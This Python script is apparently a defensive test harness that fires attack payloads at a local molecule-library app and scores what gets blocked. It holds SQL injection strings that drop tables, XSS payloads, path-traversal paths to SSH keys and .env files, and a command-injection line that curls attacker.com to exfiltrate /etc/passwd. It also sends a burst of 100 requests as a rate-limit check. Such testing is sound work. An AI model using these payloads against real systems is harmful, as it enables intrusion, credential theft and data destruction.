#!/usr/bin/env python3
"""
PENETRATION TEST SIMULATION - AUTHORIZED TESTING ONLY
Tests security measures by simulating various attack vectors.
"""

import base64
import json
import os
import sys
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import Any, Dict, List

import requests

# ANSI color codes
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
BLUE = "\033[94m"
MAGENTA = "\033[95m"
CYAN = "\033[96m"
RESET = "\033[0m"
BOLD = "\033[1m"

BASE_URL = "http://localhost:8000"
ATTACK_RESULTS = {
    "successful_attacks": [],
    "blocked_attacks": [],
    "vulnerabilities_found": [],
    "security_score": 100,
}


class AttackSimulator:
    """Simulates various attack vectors to test security"""

    def __init__(self, base_url: str):
        self.base_url = base_url
        self.session = requests.Session()

    def print_header(self, title: str):
        """Print attack section header"""
        print(f"\n{BOLD}{CYAN}{'='*70}{RESET}")
        print(f"{BOLD}{CYAN}  {title}{RESET}")
        print(f"{BOLD}{CYAN}{'='*70}{RESET}\n")

    def print_attack(self, name: str, description: str):
        """Print attack attempt"""
        print(f"{YELLOW}🔥 Attack: {name}{RESET}")
        print(f"   Description: {description}")

    def print_result(self, blocked: bool, details: str):
        """Print attack result"""
        if blocked:
            print(f"   {GREEN}✓ BLOCKED{RESET} - {details}\n")
            ATTACK_RESULTS["blocked_attacks"].append({"attack": details, "blocked": True})
        else:
            print(f"   {RED}✗ SUCCESSFUL{RESET} - {details}\n")
            ATTACK_RESULTS["successful_attacks"].append({"attack": details, "exploited": True})
            ATTACK_RESULTS["security_score"] -= 10
            ATTACK_RESULTS["vulnerabilities_found"].append(details)

    # ========== SQL INJECTION ATTACKS ==========

    def test_sql_injection_login(self):
        """Attempt SQL injection in authentication"""
        self.print_attack(
            "SQL Injection - Authentication Bypass",
            "Attempting to bypass authentication with SQL injection",
        )

        payloads = [
            "admin' OR '1'='1",
            "admin'--",
            "admin' OR 1=1--",
            "' OR 'x'='x",
            "1' UNION SELECT NULL,NULL,NULL--",
            "admin'; DROP TABLE users--",
        ]

        blocked_count = 0
        for payload in payloads:
            try:
                response = self.session.post(
                    f"{self.base_url}/auth/login",
                    json={"username": payload, "password": "test"},
                    timeout=3,
                )
                if response.status_code == 400 or "malicious" in response.text.lower():
                    blocked_count += 1
            except:
                pass

        if blocked_count == len(payloads):
            self.print_result(True, f"All {len(payloads)} SQL injection attempts blocked")
        else:
            self.print_result(
                False, f"SQL injection possible ({len(payloads) - blocked_count} succeeded)"
            )

    def test_sql_injection_search(self):
        """Attempt SQL injection in search endpoints"""
        self.print_attack(
            "SQL Injection - Search/Query Injection", "Attempting SQL injection in library search"
        )

        payloads = [
            {"formula": "C'; DROP TABLE molecules--"},
            {"notes": "test' UNION SELECT password FROM users--"},
            {"tags": ["'; DELETE FROM sessions--"]},
        ]

        blocked_count = 0
        for payload in payloads:
            try:
                response = self.session.post(
                    f"{self.base_url}/library/search", json=payload, timeout=3
                )
                if response.status_code == 400 or "malicious" in response.text.lower():
                    blocked_count += 1
            except:
                pass

        if blocked_count >= len(payloads) * 0.8:
            self.print_result(
                True, f"SQL injection in search blocked ({blocked_count}/{len(payloads)})"
            )
        else:
            self.print_result(False, f"SQL injection vulnerabilities found")

    # ========== XSS ATTACKS ==========

    def test_xss_attacks(self):
        """Attempt Cross-Site Scripting attacks"""
        self.print_attack("XSS - Cross-Site Scripting", "Attempting to inject malicious JavaScript")

        payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg/onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src='javascript:alert(\"XSS\")'></iframe>",
        ]

        blocked_count = 0
        for payload in payloads:
            try:
                response = self.session.post(
                    f"{self.base_url}/library/save",
                    json={"molecule_id": "test", "molecule_data": {}, "notes": payload},
                    timeout=3,
                )
                if response.status_code == 400:
                    blocked_count += 1
            except:
                pass

        if blocked_count >= len(payloads) * 0.8:
            self.print_result(True, f"XSS attempts blocked ({blocked_count}/{len(payloads)})")
        else:
            self.print_result(False, f"XSS vulnerabilities possible")

    # ========== COMMAND INJECTION ==========

    def test_command_injection(self):
        """Attempt command injection attacks"""
        self.print_attack("Command Injection", "Attempting to execute system commands")

        payloads = [
            "; cat /etc/passwd",
            "| ls -la /",
            "`whoami`",
            "$(cat /home/codespace/.ssh/id_rsa)",
            "; curl http://attacker.com/steal?data=$(cat /etc/passwd)",
            "&& rm -rf /tmp/test",
        ]

        blocked_count = 0
        for payload in payloads:
            try:
                response = self.session.post(
                    f"{self.base_url}/library/save",
                    json={
                        "molecule_id": payload,
                        "molecule_data": {},
                    },
                    timeout=3,
                )
                if response.status_code == 400:
                    blocked_count += 1
            except:
                pass

        if blocked_count >= len(payloads) * 0.8:
            self.print_result(True, f"Command injection blocked ({blocked_count}/{len(payloads)})")
        else:
            self.print_result(False, f"Command injection possible")

    # ========== PATH TRAVERSAL ==========

    def test_path_traversal(self):
        """Attempt path traversal to access sensitive files"""
        self.print_attack("Path Traversal", "Attempting to access files outside web root")

        paths = [
            "../../../etc/passwd",
            "../../.env",
            "../../../home/codespace/.ssh/id_rsa",
            "../../quantumlab/backend/vault.db",
            "../../../root/.ssh/authorized_keys",
            "....//....//....//etc/passwd",
        ]

        blocked_count = 0
        for path in paths:
            try:
                response = self.session.get(f"{self.base_url}/library/molecule/{path}", timeout=3)
                # Should return 404 or 400, not 200 with file contents
                if response.status_code in [400, 404, 403]:
                    blocked_count += 1
                elif response.status_code == 200:
                    content = response.text.lower()
                    if "root:" in content or "private key" in content:
                        self.print_result(False, f"Path traversal succeeded: {path}")
                        return
            except:
                pass

        if blocked_count == len(paths):
            self.print_result(True, f"All path traversal attempts blocked")
        else:
            self.print_result(True, f"Path traversal mostly blocked ({blocked_count}/{len(paths)})")

    # ========== SSH KEY THEFT ==========

    def test_ssh_key_theft(self):
        """Attempt to steal SSH private keys"""
        self.print_attack("SSH Key Theft", "Attempting to access stored SSH credentials")

        # Try direct file access
        ssh_paths = [
            "/home/codespace/.ssh/id_rsa",
            "/home/codespace/.ssh/id_ed25519",
            "/root/.ssh/id_rsa",
        ]

        key_found = False
        for path in ssh_paths:
            if os.path.exists(path):
                try:
                    with open(path, "r") as f:
                        content = f.read()
                        if "PRIVATE KEY" in content:
                            # This is expected in a dev environment, but check if it's protected
                            key_found = True
                            # Check file permissions
                            stat_info = os.stat(path)
                            mode = oct(stat_info.st_mode)[-3:]
                            if mode == "600" or mode == "400":
                                print(
                                    f"   Found key at {path} but properly protected (mode {mode})"
                                )
                            else:
                                self.print_result(
                                    False, f"SSH key at {path} has insecure permissions: {mode}"
                                )
                                return
                except PermissionError:
                    print(f"   {GREEN}✓{RESET} Access denied to {path}")

        # Try to access via API endpoints
        endpoints = [
            "/cloud/credentials/ssh",
            "/system/files?path=/home/codespace/.ssh/id_rsa",
        ]

        api_blocked = True
        for endpoint in endpoints:
            try:
                response = self.session.get(f"{self.base_url}{endpoint}", timeout=3)
                if response.status_code == 200:
                    data = response.json()
                    if "private_key" in str(data).lower() or "-----BEGIN" in str(data):
                        api_blocked = False
            except:
                pass

        if api_blocked:
            self.print_result(True, "SSH keys not accessible via API")
        else:
            self.print_result(False, "SSH private keys exposed via API")

    # ========== DATABASE ACCESS ==========

    def test_database_access(self):
        """Attempt to access internal database files"""
        self.print_attack("Database File Access", "Attempting to download database files")

        db_files = [
            "/workspaces/algo/quantumlab/backend/vault.db",
            "/workspaces/algo/quantumlab/backend/molecule_library.db",
            "../backend/vault.db",
            "../../backend/vault.db",
        ]

        blocked = True
        for db_path in db_files:
            # Check if database exists and has proper permissions
            if os.path.exists(db_path):
                stat_info = os.stat(db_path)
                mode = oct(stat_info.st_mode)[-3:]
                if int(mode) > 600:
                    print(
                        f"   {YELLOW}⚠{RESET}  Database {db_path} permissions: {mode} (should be 600)"
                    )

            # Try to access via API
            try:
                response = self.session.get(
                    f"{self.base_url}/library/export?file={db_path}", timeout=3
                )
                if response.status_code == 200 and len(response.content) > 1000:
                    blocked = False
            except:
                pass

        if blocked:
            self.print_result(True, "Database files not accessible via API")
        else:
            self.print_result(False, "Database files can be downloaded")

    # ========== RATE LIMITING / DDoS ==========

    def test_ddos_attack(self):
        """Simulate DDoS attack to test rate limiting"""
        self.print_attack(
            "DDoS - Distributed Denial of Service",
            "Flooding server with requests to test rate limiting",
        )

        num_requests = 100
        blocked_count = 0

        print(f"   Sending {num_requests} rapid requests...")

        def make_request(i):
            try:
                response = requests.get(f"{self.base_url}/models", timeout=2)
                return response.status_code
            except:
                return 500

        with ThreadPoolExecutor(max_workers=20) as executor:
            futures = [executor.submit(make_request, i) for i in range(num_requests)]
            for future in as_completed(futures):
                status = future.result()
                if status == 429:  # Rate limited
                    blocked_count += 1

        if blocked_count > 0:
            self.print_result(
                True, f"Rate limiting active ({blocked_count}/{num_requests} requests blocked)"
            )
        else:
            self.print_result(False, "No rate limiting - DDoS possible")

    # ========== AUTHENTICATION BYPASS ==========

    def test_auth_bypass(self):
        """Attempt to bypass authentication"""
        self.print_attack(
            "Authentication Bypass", "Attempting to access protected endpoints without auth"
        )

        # Try common bypass techniques
        bypass_attempts = [
            ("Cookie manipulation", {"Cookie": "admin=true; authenticated=1"}),
            ("Token forgery", {"Authorization": "Bearer fake_token_12345"}),
            ("Header injection", {"X-User-Id": "1", "X-Is-Admin": "true"}),
        ]

        blocked_count = 0
        for name, headers in bypass_attempts:
            try:
                response = requests.get(
                    f"{self.base_url}/cloud/credentials/ssh", headers=headers, timeout=3
                )
                if response.status_code in [401, 403]:
                    blocked_count += 1
            except:
                pass

        if blocked_count == len(bypass_attempts):
            self.print_result(True, "Authentication bypass attempts blocked")
        else:
            self.print_result(False, "Authentication bypass possible")

    # ========== SENSITIVE DATA EXPOSURE ==========

    def test_sensitive_data_exposure(self):
        """Check for exposed sensitive data"""
        self.print_attack(
            "Sensitive Data Exposure", "Checking for exposed credentials, keys, tokens"
        )

        endpoints = ["/", "/models", "/elements", "/system/specs"]

        exposed = False
        for endpoint in endpoints:
            try:
                response = self.session.get(f"{self.base_url}{endpoint}", timeout=3)
                if response.status_code == 200:
                    text = response.text.lower()
                    sensitive_patterns = [
                        "password",
                        "api_key",
                        "secret",
                        "private_key",
                        "database_url",
                        "postgres://",
                    ]
                    for pattern in sensitive_patterns:
                        if pattern in text:
                            exposed = True
                            print(f"   {YELLOW}⚠{RESET}  Found '{pattern}' in {endpoint}")
            except:
                pass

        if not exposed:
            self.print_result(True, "No sensitive data exposed in API responses")
        else:
            self.print_result(False, "Sensitive data found in API responses")

    # ========== SECURITY HEADERS ==========

    def test_security_headers(self):
        """Verify security headers are present"""
        self.print_attack("Security Headers Check", "Verifying presence of security headers")

        try:
            response = self.session.get(f"{self.base_url}/models", timeout=3)

            required_headers = {
                "X-Frame-Options": "DENY",
                "X-Content-Type-Options": "nosniff",
                "Content-Security-Policy": None,
                "Referrer-Policy": None,
            }

            missing = []
            for header, expected in required_headers.items():
                if header not in response.headers:
                    missing.append(header)
                elif expected and response.headers[header] != expected:
                    print(
                        f"   {YELLOW}⚠{RESET}  {header}: {response.headers[header]} (expected: {expected})"
                    )

            if not missing:
                self.print_result(True, "All security headers present")
            else:
                self.print_result(False, f"Missing headers: {', '.join(missing)}")
        except Exception as e:
            self.print_result(False, f"Could not check headers: {e}")


def run_penetration_test():
    """Run comprehensive penetration test"""

    print(f"\n{BOLD}{RED}{'='*70}{RESET}")
    print(f"{BOLD}{RED}  🔴 PENETRATION TEST SIMULATION{RESET}")
    print(f"{BOLD}{RED}  ⚠️  AUTHORIZED SECURITY TESTING ONLY{RESET}")
    print(f"{BOLD}{RED}{'='*70}{RESET}\n")

    print(f"{CYAN}Target: {BASE_URL}{RESET}")
    print(f"{CYAN}Testing: Injection, XSS, Auth Bypass, SSH Keys, Database Access{RESET}\n")

    time.sleep(2)

    attacker = AttackSimulator(BASE_URL)

    # Run all attack simulations
    attacker.print_header("🔓 INJECTION ATTACKS")
    attacker.test_sql_injection_login()
    attacker.test_sql_injection_search()
    attacker.test_xss_attacks()
    attacker.test_command_injection()

    attacker.print_header("📁 FILE SYSTEM ATTACKS")
    attacker.test_path_traversal()
    attacker.test_ssh_key_theft()
    attacker.test_database_access()

    attacker.print_header("🌊 DENIAL OF SERVICE")
    attacker.test_ddos_attack()

    attacker.print_header("🔐 AUTHENTICATION & AUTHORIZATION")
    attacker.test_auth_bypass()
    attacker.test_sensitive_data_exposure()

    attacker.print_header("🛡️ SECURITY CONFIGURATION")
    attacker.test_security_headers()

    # Print final report
    print(f"\n{BOLD}{MAGENTA}{'='*70}{RESET}")
    print(f"{BOLD}{MAGENTA}  📊 PENETRATION TEST REPORT{RESET}")
    print(f"{BOLD}{MAGENTA}{'='*70}{RESET}\n")

    score = ATTACK_RESULTS["security_score"]

    if score >= 90:
        color = GREEN
        rating = "EXCELLENT"
    elif score >= 70:
        color = YELLOW
        rating = "GOOD"
    elif score >= 50:
        color = YELLOW
        rating = "MODERATE"
    else:
        color = RED
        rating = "POOR"

    print(f"{BOLD}Security Score: {color}{score}/100 ({rating}){RESET}\n")

    print(f"{GREEN}✓ Attacks Blocked: {len(ATTACK_RESULTS['blocked_attacks'])}{RESET}")
    print(f"{RED}✗ Successful Attacks: {len(ATTACK_RESULTS['successful_attacks'])}{RESET}")
    print(
        f"{YELLOW}⚠ Vulnerabilities Found: {len(ATTACK_RESULTS['vulnerabilities_found'])}{RESET}\n"
    )

    if ATTACK_RESULTS["vulnerabilities_found"]:
        print(f"{BOLD}{RED}Critical Vulnerabilities:{RESET}")
        for vuln in ATTACK_RESULTS["vulnerabilities_found"]:
            print(f"  • {vuln}")
        print()

    print(f"{BOLD}Recommendations:{RESET}")
    if score >= 90:
        print(f"  {GREEN}✓ Security posture is strong{RESET}")
        print(f"  {GREEN}✓ Continue monitoring and updating security measures{RESET}")
    else:
        print(f"  {RED}• Address vulnerabilities listed above{RESET}")
        print(f"  {RED}• Review and strengthen input validation{RESET}")
        print(f"  {RED}• Implement additional security layers{RESET}")

    print(f"\n{BOLD}{MAGENTA}{'='*70}{RESET}\n")

    # Save report
    report_file = "/workspaces/algo/security_tests/penetration_test_report.json"
    with open(report_file, "w") as f:
        json.dump(ATTACK_RESULTS, f, indent=2)
    print(f"📄 Full report saved to: {report_file}\n")


if __name__ == "__main__":
    try:
        run_penetration_test()
    except KeyboardInterrupt:
        print(f"\n{YELLOW}Test interrupted by user{RESET}\n")
        sys.exit(0)
